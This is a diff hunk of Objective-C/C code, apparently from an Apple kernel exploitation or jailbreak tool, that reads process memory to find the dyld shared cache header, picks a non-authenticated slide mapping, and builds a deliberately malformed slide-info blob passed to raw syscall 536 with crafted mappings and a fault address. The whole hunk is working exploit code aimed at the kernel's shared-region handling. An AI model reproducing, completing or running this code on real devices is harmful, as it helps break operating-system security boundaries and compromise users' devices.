@@ -9488,13 +9488,109 @@ static uint64_t rie_find_exec_base(task_t task,
                         rie_mach_vm_size_t outSz = 0;
                         kr = rie_vmRead2(mach_task_self(), walk, RIE_TRY_SIZE,
                             (rie_mach_vm_address_t)(uintptr_t)tryBuf, &outSz);
-                        if (kr == KERN_SUCCESS && outSz >= 4) {
-                            uint32_t magic; memcpy(&magic, tryBuf, 4);
-                            [self appendLog:[NSString stringWithFormat:@"  vm_read OK: %llu bytes, magic=0x%08x",
-                                (unsigned long long)outSz, magic]];
-                            if (magic == 0x64796c64) {
+                        if (kr == KERN_SUCCESS && outSz >= 16) {
+                            char magicStr[17] = {0};
+                            memcpy(magicStr, tryBuf, 16);
+                            BOOL isDyld = (memcmp(tryBuf, "dyld_v1", 7) == 0);
+                            [self appendLog:[NSString stringWithFormat:@"  vm_read OK: %llu bytes, magic='%s' %s",
+                                (unsigned long long)outSz, magicStr, isDyld ? @"<<< DYLD" : @""]];
+                            if (isDyld) {
                                 [self appendLog:[NSString stringWithFormat:@"  *** FOUND dyld_v1 header at 0x%llx! ***",
                                     (unsigned long long)walk]];
+                                // Parse header: MWS, code sig, etc.
+                                #define RIE_RD32(off) (*(uint32_t*)(tryBuf + (off)))
+                                #define RIE_RD64(off) (*(uint64_t*)(tryBuf + (off)))
+                                uint32_t mws_off = RIE_RD32(0x138), mws_cnt = RIE_RD32(0x13c);
+                                uint64_t cs_off  = RIE_RD64(0x028), cs_sz   = RIE_RD64(0x030);
+                                [self appendLog:[NSString stringWithFormat:@"  MWS: off=0x%x cnt=%u codeSig=0x%llx+0x%llx",
+                                    mws_off, mws_cnt, cs_off, cs_sz]];
+                                // Read larger chunk for MWS parsing
+                                #define RIE_FULL_SIZE 0x10000
+                                uint8_t *fullHdr = (uint8_t *)malloc(RIE_FULL_SIZE);
+                                if (fullHdr) {
+                                    memset(fullHdr, 0, RIE_FULL_SIZE);
+                                    rie_mach_vm_size_t fullSz = 0;
+                                    if (rie_vmRead2(mach_task_self(), walk, RIE_FULL_SIZE,
+                                        (rie_mach_vm_address_t)(uintptr_t)fullHdr, &fullSz) == KERN_SUCCESS) {
+                                        int foundNA = -1;
+                                        uint64_t naAddr=0, naSize=0, naFoff=0, naSlide=0, naFlags=0;
+                                        uint32_t naMax=0, naInit=0;
+                                        #define MWS_ESZ 56
+                                        for (uint32_t mi = 0; mi < mws_cnt && mi < 20; mi++) {
+                                            const uint8_t *m = fullHdr + mws_off + mi * MWS_ESZ;
+                                            uint64_t a, sz, fo, sl, fl;
+                                            uint32_t mp, ip;
+                                            memcpy(&a, m+0,8); memcpy(&sz, m+8,8);
+                                            memcpy(&fo, m+16,8); memcpy(&sl, m+32,8);
+                                            memcpy(&fl, m+40,8); memcpy(&mp, m+48,4); memcpy(&ip, m+52,4);
+                                            BOOL isSlide = (sl != 0), isAuth = (fl & 1);
+                                            NSString *tag = isSlide ? (isAuth ? @"AUTH" : @"<<< NONAUTH <<<") : @"NOSLIDE";
+                                            [self appendLog:[NSString stringWithFormat:@"    MWS[%u] a=0x%llx sz=0x%llx sl=0x%llx fl=0x%llx p=%x/%x %@",
+                                                mi, a, sz, sl, fl, mp, ip, tag]];
+                                            if (isSlide && !isAuth && foundNA < 0) {
+                                                foundNA = (int)mi;
+                                                naAddr=a; naSize=sz; naFoff=fo; naSlide=sl; naFlags=fl;
+                                                naMax=mp; naInit=ip;
+                                            }
+                                        }
+                                        #undef MWS_ESZ
+                                        if (foundNA >= 0) {
+                                            [self appendLog:[NSString stringWithFormat:@"  target non-auth: MWS[%d] a=0x%llx sz=0x%llx foff=0x%llx slide=0x%llx",
+                                                foundNA, naAddr, naSize, naFoff, naSlide]];
+                                            // Build slide blob
+                                            #define BLOB_PS 0x4000
+                                            #define BLOB_PC 64
+                                            size_t blobSz = 24 + BLOB_PC * 2;
+                                            uint8_t *blob = (uint8_t *)calloc(1, blobSz);
+                                            if (blob) {
+                                                uint32_t v5=5; uint64_t va=0;
+                                                memcpy(blob, &v5, 4); memcpy(blob+4, &(uint32_t){BLOB_PS}, 4);
+                                                memcpy(blob+8, &(uint32_t){BLOB_PC}, 4); memcpy(blob+16, &va, 8);
+                                                uint16_t *ps = (uint16_t*)(blob+24);
+                                                for (uint32_t j=0; j<BLOB_PC; j++) ps[j]=0xFFFF;
+                                                ps[2]=0xFFFE;
+                                                [self appendLog:[NSString stringWithFormat:@"  blob: ver=5 ps=0x%x cnt=%u total=%zu",
+                                                    BLOB_PS, BLOB_PC, blobSz]];
+                                                // Build config + call syscall 536
+                                                #define CFG_SZ (sizeof(struct rie_sr_cfg) + 0x4000)
+                                                void *cfg = mmap(NULL, CFG_SZ, PROT_READ|PROT_WRITE,
+                                                    MAP_PRIVATE|MAP_ANON, -1, 0);
+                                                if (cfg != MAP_FAILED) {
+                                                    memset(cfg, 0, CFG_SZ);
+                                                    struct rie_sr_cfg *c = (struct rie_sr_cfg *)cfg;
+                                                    c->magic = RIE_SR_CFG_MAGIC;
+                                                    c->blob_off = 0x4000;
+                                                    c->files[0].sf_fd = -1; c->files[0].sf_mappings_count = 1;
+                                                    c->files[1].sf_fd = -1; c->files[1].sf_mappings_count = 1;
+                                                    c->mappings[0].sms_address = 0x180000000ULL;
+                                                    c->mappings[0].sms_size = naSize;
+                                                    c->mappings[0].sms_max_prot = 1; c->mappings[0].sms_init_prot = 1;
+                                                    c->mappings[1].sms_address = 0x180000000ULL + naSize;
+                                                    c->mappings[1].sms_size = 0x4000;
+                                                    c->mappings[1].sms_file_offset = (uint64_t)(uintptr_t)((uint8_t*)cfg + 0x4000);
+                                                    c->mappings[1].sms_max_prot = 1; c->mappings[1].sms_init_prot = 1;
+                                                    c->fault_addr = naAddr;
+                                                    c->blob_size = blobSz;
+                                                    memcpy((uint8_t*)cfg + 0x4000, blob, blobSz);
+                                                    [self appendLog:[NSString stringWithFormat:@"  calling syscall 536(2f,2m) fault=0x%llx...", naAddr]];
+                                                    long r1 = sc(536, 2, c->files, 2, c->mappings);
+                                                    [self appendLog:[NSString stringWithFormat:@"  syscall(536): ret=%ld errno=%d", r1, errno]];
+                                                    munmap(cfg, CFG_SZ);
+                                                }
+                                                #undef CFG_SZ
+                                                free(blob);
+                                            }
+                                            #undef BLOB_PS
+                                            #undef BLOB_PC
+                                        } else {
+                                            [self appendLog:@"  !! no non-auth slide carrier found"];
+                                        }
+                                    }
+                                    free(fullHdr);
+                                    #undef RIE_FULL_SIZE
+                                }
+                                #undef RIE_RD32
+                                #undef RIE_RD64
                                 foundHdr = YES;
                                 free(tryBuf);
                                 break;
